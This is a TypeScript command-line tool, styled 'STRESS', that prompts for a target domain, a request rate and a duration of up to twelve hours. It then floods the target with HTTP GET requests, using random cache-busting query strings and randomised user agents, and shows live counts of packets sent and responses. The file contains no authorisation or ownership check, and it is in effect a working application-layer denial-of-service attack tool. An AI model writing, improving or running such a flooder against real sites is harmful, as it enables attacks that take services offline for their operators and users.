import dayjs from 'dayjs';
import dayjs_duration from 'dayjs/plugin/duration';
import random_ua from 'random-useragent';
import { typof } from 'typof';
import { styles } from '@keift/utils';
import readline from 'readline';

import _package from '../package.json';

const intervals = new Map<string, NodeJS.Timeout>();

dayjs.extend(dayjs_duration);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const question = (query: string) =>
  new Promise<string>((resolve) => {
    rl.question(query, resolve);
  });

const print = () => {
  console.clear();

  console.log('\n');
  console.log(`   ${styles.fg.gray}#####   ######   #####    #####    #####    #####`, styles.reset);
  console.log(`  ${styles.fg.gray}##         ##     ##  ##   ##      ##       ##`, styles.reset);
  console.log(`   ${styles.fg.gray}####      ##     #####    ####     ####     ####`, styles.reset);
  console.log(`      ${styles.fg.gray}##     ##     ##  ##   ##          ##       ##`, styles.reset);
  console.log(`  ${styles.fg.gray}#####      ##     ##  ##   #####   #####    #####`, styles.reset);
  console.log('');
  console.log(`                                                 ${styles.fg.white}v${_package.version}`, styles.reset);
  console.log('');
};

const run = async () => {
  print();

  const target_question = await question(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}`);

  print();

  const target = target_question
    .toLowerCase()
    .trim()
    .replace(/^https?:\/\//, '')
    .split('/')[0];

  if (!target) {
    console.log(`  ${styles.fg.red}Field target cannot be left blank.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(target).includes('string')) {
    console.log(`  ${styles.fg.red}Field target must be a string.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  console.log(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}${target}`, styles.reset);

  const throttling_question = await question(`  ${styles.fg.blue}Throttling${styles.fg.gray}: ${styles.fg.white}`);

  print();

  if (!throttling_question) {
    console.log(`  ${styles.fg.red}Field throttling cannot be left blank.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(throttling_question).includes('integer')) {
    console.log(`  ${styles.fg.red}Field throttling must be a integer.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  const throttling = Math.max(1, Math.min(Number(throttling_question), 100));

  console.log(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}${target}`, styles.reset);
  console.log(`  ${styles.fg.blue}Throttling${styles.fg.gray}: ${styles.fg.white}${String(throttling)}`, styles.reset);

  const duration_question = await question(`  ${styles.fg.blue}Duration (s)${styles.fg.gray}: ${styles.fg.white}`);

  print();

  if (!duration_question) {
    console.log(`  ${styles.fg.red}Field duration cannot be left blank.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(duration_question).includes('integer')) {
    console.log(`  ${styles.fg.red}Field duration must be a integer.`, styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  const duration = Math.max(1, Math.min(Number(duration_question), 43200));

  console.log(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}${target}`, styles.reset);
  console.log(`  ${styles.fg.blue}Throttling${styles.fg.gray}: ${styles.fg.white}${String(throttling)}`, styles.reset);
  console.log(`  ${styles.fg.blue}Duration (s)${styles.fg.gray}: ${styles.fg.white}${String(duration)}`, styles.reset);

  console.log('');
  console.log(`  ${styles.fg.magenta}Status                          ${styles.fg.yellow}Preparing... ⟳`, styles.reset);
  console.log(`  ${styles.fg.magenta}Packets Sent                    ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Successful Resp.                ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Unsuccessful Resp.              ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Remaining Time                  ${styles.fg.gray}--`, styles.reset);
  console.log('');

  await Bun.sleep(1000);

  print();

  console.log(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}${target}`, styles.reset);
  console.log(`  ${styles.fg.blue}Throttling${styles.fg.gray}: ${styles.fg.white}${String(throttling)}`, styles.reset);
  console.log(`  ${styles.fg.blue}Duration (s)${styles.fg.gray}: ${styles.fg.white}${String(duration)}`, styles.reset);

  console.log('');
  console.log(`  ${styles.fg.magenta}Status                          ${styles.fg.yellow}Almost Ready... ⟳`, styles.reset);
  console.log(`  ${styles.fg.magenta}Packets Sent                    ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Successful Resp.                ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Unsuccessful Resp.              ${styles.fg.gray}--`, styles.reset);
  console.log(`  ${styles.fg.magenta}Remaining Time                  ${styles.fg.gray}--`, styles.reset);

  console.log('');

  await Bun.sleep(2500);

  let running = true;
  let packets_sent = 0;
  let successful_responses = 0;
  let unsuccessful_responses = 0;
  let remaining_time = duration;

  intervals.set(
    'STRESSING',
    setInterval(() => {
      void (async () => {
        for (let i = 0; i < throttling; i++) {
          packets_sent++;

          try {
            const response = await fetch(`http://${target}?${String(Math.random())}=${String(Math.random())}`, {
              method: 'GET',
              headers: {
                'User-Agent': random_ua.getRandom()
              }
            });

            if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
              successful_responses++;
            } else unsuccessful_responses++;
          } catch {
            unsuccessful_responses++;
          }
        }
      })();
    })
  );

  let previous_packets_sent = 0;
  let previous_successful_responses = 0;
  let previous_unsuccessful_responses = 0;
  let previous_remaining_time = 0;

  setInterval(() => {
    print();

    console.log(`  ${styles.fg.blue}Target${styles.fg.gray}: ${styles.fg.white}${target}`, styles.reset);
    console.log(`  ${styles.fg.blue}Throttling${styles.fg.gray}: ${styles.fg.white}${String(throttling)}`, styles.reset);
    console.log(`  ${styles.fg.blue}Duration (s)${styles.fg.gray}: ${styles.fg.white}${String(duration)}`, styles.reset);

    console.log('');
    console.log(`  ${styles.fg.magenta}Status                          ${running ? `${styles.fg.white}Running ▶` : `${styles.fg.red}Stopped ■`}`, styles.reset);
    console.log(`  ${styles.fg.magenta}Packets Sent                    ${previous_packets_sent !== packets_sent ? styles.fg.blue : styles.fg.gray}${String(packets_sent)} ↑`, styles.reset);
    console.log(`  ${styles.fg.magenta}Successful Resp.                ${previous_successful_responses !== successful_responses ? styles.fg.green : styles.fg.gray}${String(successful_responses)} ↓`, styles.reset);
    console.log(`  ${styles.fg.magenta}Unsuccessful Resp.              ${previous_unsuccessful_responses !== unsuccessful_responses ? styles.fg.red : styles.fg.gray}${String(unsuccessful_responses)} ⇣`, styles.reset);
    console.log(`  ${styles.fg.magenta}Remaining Time                  ${previous_remaining_time !== remaining_time ? styles.fg.yellow : styles.fg.gray}${dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, styles.reset);

    console.log('');

    previous_packets_sent = packets_sent;
    previous_successful_responses = successful_responses;
    previous_unsuccessful_responses = unsuccessful_responses;
    previous_remaining_time = remaining_time;
  }, 1000);

  setInterval(() => {
    if (remaining_time === 0) {
      running = false;

      clearInterval(intervals.get('STRESSING'));

      intervals.delete('STRESSING');
    } else remaining_time--;
  }, 1000);
};

void run();
